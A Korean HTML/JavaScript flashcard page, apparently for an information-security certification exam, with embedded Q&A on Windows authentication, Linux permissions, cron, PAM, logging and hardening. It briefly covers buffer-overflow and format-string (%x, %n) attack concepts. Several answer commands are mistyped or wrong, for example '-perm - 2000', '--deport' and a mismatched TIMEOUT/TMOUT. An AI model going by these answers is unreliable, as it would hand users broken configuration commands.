﻿<center>
<input type="button" value="문제 초기화" onclick="random_prob()" style="color: #fff; background:gray; font-size:2em; font-weight:bold;">
<input type="button" value="큰 화면으로 보기" onclick="full_scr()" style="color: #Eff; background:#50bcdf; font-size:2em; font-weight:bold;"><br />
<input type="button" value="글씨 크기 최대" style="color: #afe; 
background:skyblue; font-size:1em; font-weight:bold;" onclick="size_max()">
<input type="button" value="글씨 크기 최소" class="size_min" style="color: #ffc; 
background:skyblue; font-size:1em; font-weight:bold;" onclick="size_min()">
<input type="button" value="글씨 크기 ↑" class="size_up" style="color: #afe; 
background:skyblue; font-size:1em; font-weight:bold;">
<input type="button" value="글씨 크기 ↓" class="size_do" style="color: #ffc; 
background:lightblue; font-size:1em; font-weight:bold;">

  <br /><br />

<div id="problem_area"></div>
<textarea rows="5" cols="50" id="problem_text" placeholder="" autofocus="" required="" wrap="hard" disabled=""></textarea><br /><br />

<div id="answer_area"><font color="mediumturquoise" size="6px"><b>→ 답안지 ←

</b></font></div>
<textarea rows="5" cols="50" id="answer_text" placeholder="" autofocus="" required="" wrap="hard"></textarea><br /><br />
  

<input type="button" id="view_ans" value="답안 보기" onclick="view_answer()" style="color: #fff; 
background:blue; font-size:2em; font-weight:bold; border-radius:0.5em; padding:5px 20px;">


<input type="button" id="next_pro" value="다음 문제" onclick="next_prob()" style="color: #fff; background:green; font-size:2em; font-weight:bold; border-radius:0.5em; padding:5px 20px;">
<input type="button" id="prev_pro" value="이전 문제" onclick="prev_prob()" style="color: #ffE; background:lightgreen; font-size:2em; font-weight:bold; border-radius:0.5em; padding:5px 20px;"><br /><br />
  
<div id="solv_prob"></div>

</center>


<div id="myModal" class="modal">
     
 <table><tr> 
 
   <tr> <td class="md-content">
        <div class="modal-content"></div></td>
        <td class="md-content">
        <div class="modal-content2">
        </div></td></tr></table>

  <div class="pop_but" onClick="close_pop();">
                <span class="pop_bt" style="font-size: 26pt;" >
                     화면 닫기
                </span>
  </div>

 
    </div>


<style>
textarea
{
  width:829px;
  height:222px;
  font-weight:bold;
  color:#00004B;
  font-size:28px;
  border: #888888 6px solid;
  
}

#problem_text {
 background-color: #EBEBE4;
}


/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  overflow: auto;
  margin: 20%; /* 15% from the top and centered */
  padding: 20px;
  border-radius: 10px;
  border: 5px solid #0EF;
  width: 75%; 
  height: 80%;            
}

.modal-content2 {
  background-color: #fefefe;
  overflow: auto;
  margin: 5%; 
  padding: 20px;
  border: 5px solid #0EF;
  border-radius: 10px;
  width: 75%; 
  height: 80%;           
}

.pop_but
{
  cursor:pointer;
  text-align: center;
  padding-bottom: 10px;
  padding-top: 10px;
  width: 175px;
  right: 63px;
  background-color:blue;
  color:white;
  font-weight:bold;
  border-radius: 40px;
  position:relative;
  left:895px;
  bottom:75px;
  
  

}
       
.md-content
{
  width:1200px;
  height:800px;
} 


</style>

<script>
var xml = "";

// here
xml+='<?xml version="1.0"?>';
xml+='<problems>';
xml+='  <problem id="1">윈도우 인증 과정 구성요소를 설명하시오.</problem>';
xml+='  <answer id="1">1) LSA&lt;br&gt;로그인에 대한 검증을 하고 SRM이 생성한 로그를 기록한다.&lt;br&gt;2) SAM&lt;br&gt;사용자 계정정보를 관리한다.(linux의 shadow 파일과 같은 역할)&lt;br&gt;3) SRM &lt;br&gt;사용자에게 고유한 SID를 부여하고 SID에 권한을 부여한다.</answer>';
xml+='  <problem id="2">윈도우 인증 구조를 쓰시오.</problem>';
xml+='  <answer id="2">Challenge &amp; Response</answer>';
xml+='  <problem id="3">Lan Manager는 네트워크를 통한 파일 및 프린터 공유 등과 같은 &lt;br&gt;작업 시 인증을 담당한다.&lt;br&gt;이에 권장하는 Lan Manager 인증 수준을 쓰시오.</problem>';
xml+='  <answer id="3">NTLMv2(NT LAN Manager version 2)</answer>';
xml+='  <problem id="4">SID(Security Identifier)는 사용자나 그룹에 부여되는 고유한 &lt;br&gt;식별번호다. SID 끝부분에 덧붙는 RID(상대 ID) 코드는 &lt;br&gt;해당 사용자의 권한을 결정하는데 여러 RID 중 &lt;br&gt;가장 흔히 쓰이는 값 세 가지를 쓰시오.</problem>';
xml+='  <answer id="4">500 : 관리자(Administrator)&lt;br&gt;501 : Guest&lt;br&gt;1000 이상 : 일반 사용자 및 그룹</answer>';
xml+='  <problem id="5">umask가 333일 때, 일반 파일 생성시 최종 권한은?</problem>';
xml+='  <answer id="5">444</answer>';
xml+='  <problem id="6">모든 파일 중 소유권자가 root이고, setuid, setgid가 설정된 것을 &lt;br&gt;목록 형태로 파일을 자세하게 보는 방법은?</problem>';
xml+='  <answer id="6">find / -user root \\( -perm -4000 -o -perm - 2000 \\) -exec ls -l {} \\;</answer>';
xml+='  <problem id="7">마지막 수정일이 3일 미만인 파일을 검색하여 상세히 출력하시오.</problem>';
xml+='  <answer id="7">find / -type f -mtime -3 -exec ls -al {} \\;</answer>';
xml+='  <problem id="8">crontab을 이용하여 다음을 설정하시오.&lt;br&gt;1) 매일 01시에 batch.sh 실행&lt;br&gt;2) 매일 8시, 9시, 10시에 batch.sh 실행&lt;br&gt;3) 매일 1시, 2시, 5시에 batch.sh 실행&lt;br&gt;4) 매 5분 간격으로 batch.sh 실행</problem>';
xml+='  <answer id="8">1) 0 1 * * * batch.sh&lt;br&gt;2) 0 8-10 * * * batch.sh&lt;br&gt;3) 0 1,2,5 * * * batch.sh&lt;br&gt;4) */5 * * * * batch.sh</answer>';
xml+='  <problem id="9">crontab은 cron.allow, cron.deny 파일에 등록된 사용자만이&lt;br&gt;crontab을 실행할 수 있다.&lt;br&gt;위 두 파일의 존재 유무에 따른 동작 방식 네 가지를 쓰시오.</problem>';
xml+='  <answer id="9">cron.allow만 존재  - white list 기반&lt;br&gt;cron.deny만 존재 - black list 기반 &lt;br&gt;두 파일 모두 없음  -  root만 cron 명령을 사용할 수 있다.&lt;br&gt;두 파일 모두 존재  -  cron.allow를 우선 적용한다.</answer>';
xml+='  <problem id="10">crontab은 정해진 시간에 작업을 수행하므로&lt;br&gt;그 시간대 시스템이 꺼져 있으면 작동하지 않는다.&lt;br&gt;이를 보완한 명령으로써 시스템이 꺼져있어도 작동하는 명령은?</problem>';
xml+='  <answer id="10">anacron</answer>';
xml+='  <problem id="11">예약작업 수행 명령어인 anacron의 특징은?</problem>';
xml+='  <answer id="11">① 시스템이 종료되었을 때에도 작업을 실행할 수 있다.&lt;br&gt;② 예약 작업 설정(/etc/anacrontab)은 &lt;br&gt;루트 유저만 작업을 설정할 수 있다.&lt;br&gt;③ anacron은 cron과 다르게 데몬 프로세스가 존재하지 않는다.&lt;br&gt;④ 작업 실행 간격은 1일 단위다. (실행빈도의 최소단위 하루 1회)</answer>';
xml+='  <problem id="12">암호 통신을 이용하여 네트워크상의  다른 컴퓨터에 접속하여&lt;br&gt;원격으로 명령을 실행하거나 파일을 조작하는 응용 프로그램 &lt;br&gt;또는 프로토콜을 무엇이라 하는가?</problem>';
xml+='  <answer id="12">ssh</answer>';
xml+='  <problem id="13">서비스 운영 방식 중 &lt;br&gt;개별 서비스별로 서버 프로세스(데몬)가 동작하는 방식으로&lt;br&gt;속도가 빠른 장점이 있지만, 서버 리소스도 많이 점유하는 방식은?</problem>';
xml+='  <answer id="13">standalone</answer>';
xml+='  <problem id="14">서비스 운영 방식 중&lt;br&gt;클라이언트가 서비스를 요청할 때 슈퍼 데몬에 의해서 해당 데몬을&lt;br&gt;실행해 주는 방식이다. &lt;br&gt;즉, 실제 서비스는 요청시에만 활동을 한다. &lt;br&gt;시스템 자원 소모가 적은 이점이 있으며, &lt;br&gt;대표적인 서비스로 텔넷,pop3,finger 등이 있는 운영 방식은?</problem>';
xml+='  <answer id="14">xinetd</answer>';
xml+='  <problem id="15">리눅스의 서비스 운영방식은 두 가지로 &lt;br&gt;standalone, inetd 방식이다.&lt;br&gt;각 방식에서 사용하는 파일의 경로를 적으시오.</problem>';
xml+='  <answer id="15">standalone - /etc/rc.d/init.d/ &lt;br&gt;inetd - /etc/xinetd.d/</answer>';
xml+='  <problem id="16">리눅스의 서비스 운영 방식 중에서&lt;br&gt;httpd, mysql, sendmail, named, sshd 등을 사용하는 방식은?&lt;br&gt;</problem>';
xml+='  <answer id="16">standalone</answer>';
xml+='  <problem id="17">inetd.conf 파일의 구조는?</problem>';
xml+='  <answer id="17">서비스명  소켓타입  프로토콜  플래그  계정  절대경로  실행 인수</answer>';
xml+='  <problem id="18">리눅스에서 호스트 접근 제어를 위한 파일 두 가지를 쓰시오.</problem>';
xml+='  <answer id="18">/etc/hosts.allow - 접근 허용&lt;br&gt;/etc/hosts.deny - 접근 제한</answer>';
xml+='  <problem id="19">PAM(Pluggable Authentication Modules)을 설명하시오.</problem>';
xml+='  <answer id="19">리눅스 시스템 내에서 어플리케이션 인증을 위해 제공하는&lt;br&gt;다양한 인증용 라이브러리다.</answer>';
xml+='  <problem id="20">리눅스 시스템에 설치된 각 프로그램이 개별적으로 인증을&lt;br&gt;진행하는 불편함을 해소하고자 중앙 집중 인증 메커니즘을 구현한 기술은?</problem>';
xml+='  <answer id="20">PAM(Pluggable Authentication Modules)</answer>';
xml+='  <problem id="21">PAM 라이브러리를 이용하는 각 응용 프로그램의 &lt;br&gt;설정 파일이 위치하는 곳은?</problem>';
xml+='  <answer id="21">/etc/pam.d</answer>';
xml+='  <problem id="22">PAM 라이브러리가 제공하는 다양한 인증 모듈이 위치하는 곳은?</problem>';
xml+='  <answer id="22">/lib/security</answer>';
xml+='  <problem id="23">리눅스에서 root 계정 원격 접속을 제한하는 방법은?</problem>';
xml+='  <answer id="23">1) /etc/pam.d 디렉터리에서 remote 서비스 설정 파일 편집&lt;br&gt;2) auth required pam_securetty.so 추가&lt;br&gt;3) pam_securetty.so 모듈이 사용하는 /etc/securetty &lt;br&gt;파일에서 pts/~터미널을 제거 or 주석 처리</answer>';
xml+='  <problem id="24">SSH에서 root 계정 원격접속을 차단하는 방법은?</problem>';
xml+='  <answer id="24"># vi vi /etc/ssh/sshd_config &lt;br&gt;# "PermitRootLogin no" 설정&lt;br&gt;</answer>';
xml+='  <problem id="25">리눅스 PAM의 인증을 위한 네 가지 모듈을 서술하시오.</problem>';
xml+='  <answer id="25">1) 계정 모듈(account module)&lt;br&gt;명시된 계정이 현재 조건에서 유효한 인증 목표인지를 검사한다. 이것은 계정 유효기간, 시간 그리고 사용자가 요청된 서비스에 &lt;br&gt;접근 가능한지 같은 조건을 포함한다.&lt;br&gt;&lt;br&gt;2) 인증 모듈(authentication module)들은 비밀번호를 요청하고&lt;br&gt;검사하는 것 같이 사용자의 신원을 확인한다.&lt;br&gt;&lt;br&gt;3) 비밀번호 모듈(password module)&lt;br&gt;비밀번호 갱신을 책임진다.&lt;br&gt;또한 강력한 비밀번호 강화에도 사용된다.&lt;br&gt;&lt;br&gt;4)세션 모듈(session module)&lt;br&gt;세션 시작과 끝에 수행되는 행동을 정의한다. &lt;br&gt;그 후 사용자는 성공적으로 인증된다.</answer>';
xml+='  <problem id="26">SOLARIS, AIX, HP-UX의 root 계정 원격 제한 설정 방법은?</problem>';
xml+='  <answer id="26">● SOLARIS&lt;br&gt;/etc/default/login 파일에서 CONSOLE=/dev/console로 설정&lt;br&gt;&lt;br&gt;● AIX : /etc/security/user 파일에서 rlogin=false 설정&lt;br&gt;● HP-UX : /etc/securetty 파일에 console 설정&lt;br&gt;</answer>';
xml+='  <problem id="27">root 계정 su를 제한하는 방법은?&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="27">1) wheel 그룹에 su 명령어를 사용할 사용자를 추가한다.&lt;br&gt;# usermod -g wheel 계정명&lt;br&gt;&lt;br&gt;2) wheel 그룹의 사용자만이 su 명령어를 사용한다.&lt;br&gt;# vi /etc/pam.d/su&lt;br&gt;auth required pam_wheel.so use_uid debug</answer>';
xml+='  <problem id="28">sudo의 개념과 명령어 설정 파일은?</problem>';
xml+='  <answer id="28">다른 사용자 계정 권한으로 명령어를 실행하고자 할 때 &lt;br&gt;사용하며, 설정 파일은 /etc/sudoers 이다.</answer>';
xml+='  <problem id="29">sudoers 파일에 다음과 같은 설정을 하는 방법은?&lt;br&gt;&lt;br&gt;1) security 계정은 sudo 명령을 통해 모든 호스트에서 &lt;br&gt;모든 계정 권한으로 모든 명령을 실행할 수 있다.&lt;br&gt;&lt;br&gt;2) security 계정은 sudo 명령을 통해 모든 호스트에서 &lt;br&gt;모든 계정 권한으로 모든 명령을 비밀번호 확인 없이 &lt;br&gt;실행할 수 있다.&lt;br&gt;&lt;br&gt;3) security 계정은 sudo 명령을 통해 192.168.0.100 &lt;br&gt;호스트에서 root 권한으로 모든 명령을 실행할 수 있다.&lt;br&gt;&lt;br&gt;4) security 계정은 sudo 명령을 통해 모든 호스트에서&lt;br&gt;모든 계정 권한으로 /was/batch/log_batch.sh 명령을 &lt;br&gt;실행할 수 있다.&lt;br&gt;&lt;br&gt;5) security 계정은 sudo 명령을 통해 모든 호스트에서 root,&lt;br&gt;kiwi99, kiwi88 계정 권한으로 모든 명령을 실행 할 수 있다.</problem>';
xml+='  <answer id="29">1) security ALL=(ALL) ALL&lt;br&gt;2) security ALL=(ALL) NOPASSWD: ALL&lt;br&gt;3) security 192.168.0.100=(ALL) ALL&lt;br&gt;4) security ALL=(ALL) /was/batch/log_batch.sh&lt;br&gt;5) security ALL=(root,kiwi99,kiwi88) ALL&lt;br&gt;</answer>';
xml+='  <problem id="30">리눅스와 유닉스에서 &lt;br&gt;현재 로그인한 사용자의 상태정보를 담고 있는 &lt;br&gt;로그 파일에 대해 설명하시오.</problem>';
xml+='  <answer id="30">Linxu - /var/run/utmp&lt;br&gt;Unix  - /var/adm/utmpx &lt;br&gt;Binary 파일로 돼 있어 "w", "who", "finger" 명령어를 통해 &lt;br&gt;확인이 가능하며, 특정 사용자 정보를 보려면 w "사용자명"을&lt;br&gt;하면 된다.</answer>';
xml+='  <problem id="31">리눅스 및 유닉스에서 &lt;br&gt;성공한 로그인/로그아웃 정보, boot/shutdown 정보에 대한 &lt;br&gt;기록을 담고 있는 로그 파일을 설명하시오.</problem>';
xml+='  <answer id="31">Linux - /var/log/wtmp &lt;br&gt;Unix - /var/adm/wtmpx &lt;br&gt;Binary 파일로 돼 있어 last 명령을 통해 확인이 가능하다.&lt;br&gt;특정 사용자를 보려면 last "사용자명" 을 하면 된다.</answer>';
xml+='  <problem id="32">리눅스 및 유닉스에서&lt;br&gt;가장 최근에 성공한 로그인 기록을 담고 있는 &lt;br&gt;로그 파일을 설명하시오.</problem>';
xml+='  <answer id="32">Linux - /var/log/lastlog &lt;br&gt;Unix - /var/adm/lastlog &lt;br&gt;Binary 파일로 돼 있어 linux는 "lastlog" unix는 "finger" 명령어로&lt;br&gt;확인 가능하다. 계정 지정은 lastlog -u [계정명] &lt;br&gt;일수 이내 접속 기간 확인 설정은 lastlog -t [일수]이다.</answer>';
xml+='  <problem id="33">리눅스 및 유닉스에서&lt;br&gt;실패한 로그인 시도에 대한 기록을 담고 있는&lt;br&gt;로그 파일을 설명하시오.</problem>';
xml+='  <answer id="33">Linux - /var/log/btmp "lastb" 명령어를 통해 확인 가능하며 &lt;br&gt;lastb "계정명"을 입력하여 확인한다.&lt;br&gt;unix - /var/adm/loginlog, 텍스트 파일로 돼 있고 &lt;br&gt;5회 이상 실패 시 실패한 로그를 남긴다.</answer>';
xml+='  <problem id="34">su 명령을 사용한 결과를 저장한 파일에 대해 설명하시오.</problem>';
xml+='  <answer id="34">linux - /var/log/secure &lt;br&gt;unix - /var/adm/sulog &lt;br&gt;텍스트 파일로 돼 있고, +는 성공 -는 실패를 의미한다.&lt;br&gt;</answer>';
xml+='  <problem id="35">리눅스 및 유닉스에서&lt;br&gt;시스템에 로그인한 모든 사용자가 로그아웃할 때까지 &lt;br&gt;입력한 명령어와 터미널의 종류, 프로세스 시작 시간 등을 &lt;br&gt;저장하는 로그 파일에 대해 설명하시오.</problem>';
xml+='  <answer id="35">linux - /var/log/pacct &lt;br&gt;( accton /var/log/pacct )&lt;br&gt;unix - /var/adm/pacct &lt;br&gt;(/usr/lib/acct/accton /var/adm/pacct)&lt;br&gt;&lt;br&gt;둘 다 Binary 파일로 실행시키려면 &lt;br&gt;lastcomm 명령어를 사용한다.</answer>';
xml+='  <problem id="36">리눅스 history 파일의 역할은?</problem>';
xml+='  <answer id="36">계정 별로 실행한 명령어에 대한 기록을 저장한 파일로&lt;br&gt;각 계정별 홈 디렉터리에 .bash_history로 존재한다.</answer>';
xml+='  <problem id="37">리눅스에서&lt;br&gt;주로 사용자/그룹 생성/삭제, 로그인 등의 사용자 인증에 대한&lt;br&gt;정보를 기록하고 있는 로그 파일로서 서버 보안에 &lt;br&gt;아주 민감하고 중요한 파일은?</problem>';
xml+='  <answer id="37">/var/log/secure</answer>';
xml+='  <problem id="38">리눅스 시스템의 가장 기본적인 시스템 로그 파일로 &lt;br&gt;시스템 운영에 대한 전반적인 메세지를 저장하고 있는 것은?</problem>';
xml+='  <answer id="38">linux - /var/log/messages&lt;br&gt;unix - /var/adm/messages &lt;br&gt;시스템 데몬들의 실행 상황과 내역, 사용자들의 접속 정보,&lt;br&gt;tcp wrapper 접근 제어 정보등이 저장된다.</answer>';
xml+='  <problem id="39">리눅스 부팅 시 출력되는 모든 메시지를 기록하는 로그 파일은?</problem>';
xml+='  <answer id="39">/var/log/dmesg</answer>';
xml+='  <problem id="40">리눅스 부팅 시 파일 시스템 체크, 서비스 데몬 실행 상태 등의 &lt;br&gt;성공/실패 여부를 확인할 수 있는 로그 파일은?</problem>';
xml+='  <answer id="40">/var/log/boot.log</answer>';
xml+='  <problem id="41">리눅스 시스템의 ftp 로그 파일로서 &lt;br&gt;proftpd 또는 vsftpd 데몬들의 서비스 내용을 기록하는 파일은?</problem>';
xml+='  <answer id="41">/var/log/xferlog</answer>';
xml+='  <problem id="42">다음을 해석하시오.&lt;br&gt;1) Fri Mar 4 19:46:44 2016 &lt;br&gt;2)1 &lt;br&gt;3)192.168.159.153 &lt;br&gt;4)1011 &lt;br&gt;5)/home/kiwi99/test.c &lt;br&gt;6)a &lt;br&gt;7)_ &lt;br&gt;8)i &lt;br&gt;9)r &lt;br&gt;10)kiwi99 &lt;br&gt;11)ftp &lt;br&gt;12)0 &lt;br&gt;13)* &lt;br&gt;14)c</problem>';
xml+='  <answer id="42">1) 날짜 및 시간 &lt;br&gt;2) 전송 시간 &lt;br&gt;3)원격 호스트 주소 &lt;br&gt;4)파일 크기 &lt;br&gt;5)전송 파일명 &lt;br&gt;6)전송 파일 종류 &lt;br&gt;7)액션 플래그(c,u,t) &lt;br&gt;8)전송 방향(i, o, d) &lt;br&gt;9)사용자 접근 방식(r,a) &lt;br&gt;10)로그인 사용자 명 &lt;br&gt;11)서비스명 &lt;br&gt;12)사용자 인증 방법&lt;br&gt;13)인증된 사용자ID &lt;br&gt;14) 파일 전송 상태( C , I )&lt;br&gt;</answer>';
xml+='  <problem id="43">리눅스 로그 기록의 동작 방식을 설명하시오.</problem>';
xml+='  <answer id="43">syslog API를 통해 로그를 생성하면 syslogd 데몬 프로세스가&lt;br&gt;syslog.conf 설정파일을 참조하여 로그를 기록한다.</answer>';
xml+='  <problem id="44">리눅스 시스템 설치 과정에서 &lt;br&gt;커널 및 하드웨어 관련 정보를 담는 로그 파일은?</problem>';
xml+='  <answer id="44">/var/log/anaconda.syslog</answer>';
xml+='  <problem id="45">리눅스에서 설정된 감사 룰에 따라서 시스템 정보를 기록하는&lt;br&gt;감사 시스템 데몬은?&lt;br&gt;</problem>';
xml+='  <answer id="45">audit</answer>';
xml+='  <problem id="46">리눅스에서 메일 송수신 관련 로그 파일은?</problem>';
xml+='  <answer id="46">/var/log/maillog</answer>';
xml+='  <problem id="47">리눅스 웹 서버 사용 시 httpd 데몬 관련 로그가&lt;br&gt;기록되는 파일은?</problem>';
xml+='  <answer id="47">/var/log/httpd</answer>';
xml+='  <problem id="48">syslog는 보안 특성을 고려하지 않고 개발되어 &lt;br&gt;UDP 로그 전송 시 공격자가 syslog를 모니터링할 수 있다.&lt;br&gt;RFC 3195 보안 기능 권고에 따라 syslog의 &lt;br&gt;기밀성 보장을 위해서 무엇을 사용하는가?</problem>';
xml+='  <answer id="48">payload를 보호할 수 있는 BEEP을 사용한다.&lt;br&gt;(연결 지향, 비동기성 연결을 위한 응용 프로토콜 프레임워크 )</answer>';
xml+='  <problem id="49">syslog의 priority 순서 의미를 설명하시오.</problem>';
xml+='  <answer id="49">0. Emergency( 시스템 사용 불가, 심각 )&lt;br&gt;1. Alert( 즉각적 조치 필요 )&lt;br&gt;2. Critical( 치명적 오류 발생 )&lt;br&gt;3. Error( 일반적 오류 발생 )&lt;br&gt;4. Warning( 경고 )&lt;br&gt;5. Notice( 관리자 조치 필요 )&lt;br&gt;6. Information( 정보 )&lt;br&gt;7. debug</answer>';
xml+='  <problem id="50">리눅스 syslog의 action에 대해 설명하시오.</problem>';
xml+='  <answer id="50">로그 남길 위치를 지정하며&lt;br&gt;콘솔, 원격 로그 서버, user(개별 사용자 스크린),&lt;br&gt;*(전체 사용자 스크린)로 분류된다.</answer>';
xml+='  <problem id="51">리눅스에서 각 서버의 모든 로그를 &lt;br&gt;로그 서버에 원격 보관하려고 한다.&lt;br&gt;원격 로그 서버 설정하는 방법을 서술하시오.</problem>';
xml+='  <answer id="51">1) 원격서버 - /etc/rsyslog.conf&lt;br&gt;$UDPServerRun 514 설정&lt;br&gt;&lt;br&gt;2) iptables -A INPUT -p udp --deport 514 -j Accept&lt;br&gt;&lt;br&gt;3) 본서버 - rsyslog.conf *.* @원격 호스트</answer>';
xml+='  <problem id="52">syslog를 다음과 같이 설정하시오.&lt;br&gt;&lt;br&gt;1) kernel에 관련된 로그를 /dev/console에 출력한다.&lt;br&gt;&lt;br&gt;2) 모든 서비스에 대해 info 수준 이상의 로그를&lt;br&gt;/var/log/messages 파일에 기록하되&lt;br&gt;mail, authpriv, cron 서비스는 제외한다.&lt;br&gt;&lt;br&gt;3) 모든 서비스의 emerg 수준 이상의 로그를 &lt;br&gt;모든 사용자에게 보내시오.&lt;br&gt;&lt;br&gt;4) uucp, news 서비스 관련 서버의 crit 수준 이상의 로그를 &lt;br&gt;/var/log/spooler에 기록한다.&lt;br&gt;&lt;br&gt;5) 시스템이 부팅될 때의 모든 로그 수준의 로그를 &lt;br&gt;/var/log/boot.log에 기록한다.</problem>';
xml+='  <answer id="52">1) kernel.*                                                                               /dev/console&lt;br&gt;&lt;br&gt;2) *.info;mail.none;authpriv.none;cron.none&lt;br&gt;/var/messages&lt;br&gt;&lt;br&gt;3) *.emerg          *&lt;br&gt;&lt;br&gt;4) uucp,news.crit                                                                       /var/log/spooler&lt;br&gt;&lt;br&gt;5) local7.*   /var/log/boot.log</answer>';
xml+='  <problem id="53">리눅스에서 텍스트 형식의 로그를 계속 모니터링 하는 명령은?</problem>';
xml+='  <answer id="53">tail -f [로그파일]</answer>';
xml+='  <problem id="54">로그파일 순환 데몬 설정 파일과 적용할 데몬 설정 파일은?</problem>';
xml+='  <answer id="54">/etc/logrotate.conf, /etc/logrotate.d</answer>';
xml+='  <problem id="55">리눅스에서 logrotate.conf 설정파일을 다음과 같이 설정한다.&lt;br&gt;&lt;br&gt;1) 일 단위로 파일 순환&lt;br&gt;2) 순환 로그 파일 개수 3개&lt;br&gt;3) 로그 파일 확장자로 날짜를 붙여 보관&lt;br&gt;4) 로그 파일을 압축&lt;br&gt;5) 100M되면 로그 파일 순환 &lt;br&gt;6) /etc/logrotate.d 파일을 포함&lt;br&gt;7) 순환 시 새롭게 로그 파일 생성</problem>';
xml+='  <answer id="55">daily, rotate3, dateext, compress, size 100M, include -, create</answer>';
xml+='  <problem id="56">리눅스 httpd 로그 서비스를 다음과 같이 설정하시오.&lt;br&gt;&lt;br&gt;1) 로그파일이 존재하지 않아도 오류가 발생하지 않는다.&lt;br&gt;2) 로그 파일이 비어있어도 순환되지 않는다.&lt;br&gt;3) 스크립트는 한 번만 실행한다.&lt;br&gt;4) 순환 후 스크립트 파일을 실행한다.</problem>';
xml+='  <answer id="56">/var/log/httpd/*log{&lt;br&gt;&lt;br&gt;    missingok&lt;br&gt;    notifempty&lt;br&gt;    sharedscripts&lt;br&gt;    postrotate&lt;br&gt;&lt;br&gt;    ~~~~~~~~&lt;br&gt;    endscript&lt;br&gt;}</answer>';
xml+='  <problem id="57">최초 정의된 힙의 메모리 사이즈를 초과하여 &lt;br&gt;문자열 등이 저장되는 경우 버퍼 오버플로우가 발생하여 &lt;br&gt;데이터와 함수 주소등을 변경하여 &lt;br&gt;공격자가 원하는 임의 코드를 실행하는 것은?</problem>';
xml+='  <answer id="57">힙 버퍼 오버플로우</answer>';
xml+='  <problem id="58">strcpy(buffer, argv[1]);를 안전한 함수로 변경하라.&lt;br&gt; </problem>';
xml+='  <answer id="58">strncpy(buffer, argv[1], sizeof(buffer)-1);&lt;br&gt;</answer>';
xml+='  <problem id="59">각각이 설명하는 버퍼 오버플로우 대응기술이 무엇인지 쓰시오.&lt;br&gt;&lt;br&gt;1) 복귀주소와 변수 사이에 특정 값을 저장해 두었다가 &lt;br&gt;(canary word) 그 값이 변경 되었을 경우 &lt;br&gt;오버플로우로 가정하여 프로그램 실행을 중단하는 기술&lt;br&gt;&lt;br&gt;2) 복귀주소를 Global RET라는 특수 스택에 저장해 두었다가 &lt;br&gt;함수 종료 시 저장된 값과 스택의 RET값을 비교해 다를 경우&lt;br&gt;오버플로우로 가정하여 프로그램 실행을 중단하는 기술&lt;br&gt;&lt;br&gt;3) 실행시 마다 메모리 주소를 변경시켜 &lt;br&gt;악성코드에 의한 특정주소 호출을 방지</problem>';
xml+='  <answer id="59">1) stack guard&lt;br&gt;2) stack shield&lt;br&gt;3) ASLR(Address Space Layout Randomization)</answer>';
xml+='  <problem id="60">외부로부터 입력된 값을 검증하지 않고 입출력 함수의 &lt;br&gt;포맷 스트링을 그대로 사용하는 경우 발생할 수 있는 취약점은?</problem>';
xml+='  <answer id="60">Format string Attack</answer>';
xml+='  <problem id="61">다음 빈칸에 들어갈 말로 알맞은 것을 고르십시오.&lt;br&gt;&lt;br&gt;스택 프레임 구조를 고려하면서 ( )를 통해 메모리 내용 참조&lt;br&gt;및 원하는 위치로 이동한 후 ( )를 통해 Return Address&lt;br&gt;악성코드가 위치한 주소로 변조하여 악성코드를 실행한다.&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="61">%x %n</answer>';
xml+='  <problem id="62">일반 계정의 UID가 0으로 설정된 경우 해야할 조치는?</problem>';
xml+='  <answer id="62">usermod -u 501</answer>';
xml+='  <problem id="63">안전한 패스워드 관리 방법에 대해 설명하시오.</problem>';
xml+='  <answer id="63">대소문자, 숫자, 특수문자중 2개를 조합하여 &lt;br&gt;10자 이상, 3개를 조합하면 8자 이상 사용한다.</answer>';
xml+='  <problem id="64">리눅스에서 10분 동안 계정 활동이 없을 경우&lt;br&gt;접속된 Session을 끊도록 설정하라.</problem>';
xml+='  <answer id="64">● SunOS  (cat /etc/default/login)&lt;br&gt;TIMEOUT=600&lt;br&gt;export TMOUT&lt;br&gt;&lt;br&gt;● Linux, AIX, HP-UX &lt;br&gt;&lt;sh, ksh, bash 사용 시&gt;&lt;br&gt;# cat /etc/.profile&lt;br&gt;TIMEOUT=600&lt;br&gt;export TMOUT&lt;br&gt;&lt;br&gt;&lt;csh 사용 시&gt;&lt;br&gt;# cat /etc/csh.login 또는, #cat /etc/csh.cshrc&lt;br&gt;set autologout=10</answer>';
xml+='  <problem id="65">리눅스에서 사용하지 않는 디렉터리나 파일&lt;br&gt;(소유자나 소유그룹이 없음)을 정리하라.</problem>';
xml+='  <answer id="65">find / \\( -nouser -o -nogroup \\) exec ls -al {} \\;</answer>';
xml+='  <problem id="66">리눅스에서 world writalbe(모든 사용자에게 쓰기가 허락된 파일)&lt;br&gt;파일을 모두 찾아라.</problem>';
xml+='  <answer id="66">find / -perm -2 -exec ls -al {} \\;</answer>';
xml+='  <problem id="67">다음 리눅스 파일들의 권장 권한은?&lt;br&gt;1)/etc/passwd &lt;br&gt;2)/etc/shadow &lt;br&gt;3)/etc/hosts &lt;br&gt;4)/etc/inetd.conf &lt;br&gt;5)/etc/syslog.conf &lt;br&gt;6)/etc/services</problem>';
xml+='  <answer id="67">1)644 &lt;br&gt;2)400 &lt;br&gt;3)600 &lt;br&gt;4)600 &lt;br&gt;5)644 &lt;br&gt;6)644</answer>';
xml+='  <problem id="68">window에서 사용자가 현재 암호 또는 최근에 사용했던 암호와 &lt;br&gt;똑같은 새 암호로 설정할 수 없도록 하여야 한다.&lt;br&gt;이에 최근 패스워드를 기억하여 변경한 암호 재사용을 &lt;br&gt;금지하는데 권장하는 최근 암호 기억 설정값은 무엇인가?</problem>';
xml+='  <answer id="68">최근 암호 기억을 12개 이상으로 설정한다.</answer>';
xml+='  <problem id="69">window에서 c 드라이브의 공유를 제거하는 방법은?</problem>';
xml+='  <answer id="69">net share c$ /delete</answer>';
xml+='  <problem id="70">윈도우 운영체제에서 어떤 로그를 남길지를 정의한 규칙은?</problem>';
xml+='  <answer id="70">감사 정책</answer>';
xml+='  <problem id="71">OSI(Open Systems Interconnection Reference Model)란?</problem>';
